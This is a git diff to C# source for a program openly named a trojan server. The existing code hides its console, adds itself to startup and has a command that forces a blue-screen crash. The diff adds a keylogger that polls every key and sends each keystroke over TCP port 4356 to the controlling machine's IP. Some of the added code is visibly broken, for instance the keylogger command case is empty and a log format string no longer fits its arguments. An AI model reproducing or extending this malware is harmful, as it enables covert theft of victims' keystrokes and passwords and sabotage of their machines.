@@ -6,6 +6,7 @@ using Microsoft.Win32;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Windows.Forms;
 
 namespace Trojan_Server
 {
@@ -32,7 +33,11 @@ namespace Trojan_Server
         short cy,
         uint uFlags
         );
-
+		
+        [DllImport("User32.dll")]
+        private static extern short GetAsyncKeyState(int vKey);
+        [DllImport("User32.dll")]
+        private static extern short GetAsyncKeyState(Keys vKey);
         [DllImport("user32.dll")]
         public static extern int FindWindow(
         string lpClassName,   
@@ -41,8 +46,10 @@ namespace Trojan_Server
         [DllImport("user32.dll")]
 		public static extern int ShowWindow(int Wnd, int Flags);
         public static NetworkStream Reciver;
+        public static NetworkStream Writer;
         [DllImport("kernel32.dll")]
         public static extern bool FreeConsole();
+        public static string IP;
         public static void Recive()
         {
             while (true)
@@ -126,8 +133,11 @@ namespace Trojan_Server
                             Log("Show Desktop!", "COMMAND");
                             break;
                         case "BSOD":
+                            Log("Crashed!", "COMMAND");
                             crash();
-                        break;
+                        	break;
+                        case "KEYLOGGER":
+                        	break;
                     }
                 }
                 catch
@@ -186,6 +196,7 @@ namespace Trojan_Server
             catch(Exception e)
             {
             	Log("Error while Adding to Startup!", "ERROR");
+            	Log(Convert.ToString(e), "EXCEPTION");
             }
             
         }
@@ -204,7 +215,7 @@ namespace Trojan_Server
         	try
         	{
         		string logLine = System.String.Format(
-        			"{0:G}: {1}: {2} ", System.DateTime.Now, art, msg);
+        			"{0:G}: {1}: {2} ", System.DateTime.Now,"|", art, msg);
         		sw.WriteLine(logLine);
         	}
         	finally 
@@ -224,6 +235,40 @@ namespace Trojan_Server
             RtlAdjustPrivilege(19 /* SeShutdownPrivilege */, true, false, out x);
             NtRaiseHardError(0xc0000022, 0, 0, 0, 6 /* OptionShutdownSystem */, out y);
         }
+        
+        public static void Keylogger(){
+        	while(true){
+        		
+        		try{
+             foreach (int i in Enum.GetValues(typeof(Keys))) {
+        				if (GetAsyncKeyState((Keys)i) == -32767){
+        					TcpClient Sender = new TcpClient(IP, 4356);
+        					Writer = Sender.GetStream();
+        					SendKeys(Convert.ToString((Keys)i));
+               	}
+	    		}	
+        	}
+        	catch(Exception e) {
+        			Log(Convert.ToString(e), "Exception");
+        	}
+        }
+        }
+        
+        public static void SendKeys(string Keys)
+        {
+            try
+            {
+                byte[] Packet = Encoding.ASCII.GetBytes(Keys);
+                Writer.Write(Packet, 0, Packet.Length);
+                Writer.Flush();
+            }
+            catch
+            {
+                Writer.Close();
+            }
+
+        }
+        
         static void Main(string[] args)
         {
             FreeConsole();
@@ -247,6 +292,10 @@ namespace Trojan_Server
                 Log("Started TcpListener..." , "ALWAYS");
                 TcpClient Connection = l.AcceptTcpClient();
                 Reciver = Connection.GetStream();
+                var pi = Reciver.GetType().GetProperty("Socket", BindingFlags.NonPublic | BindingFlags.Instance);
+                var socketIP = ((Socket)pi.GetValue(Reciver, null)).RemoteEndPoint.ToString();
+                Log("Remote IP: " + socketIP, "DEBUG");
+                IP = socketIP;
                 System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Recive));
                 Log("Started Reciver!" , "ALWAYS");
                 Rec.Start();
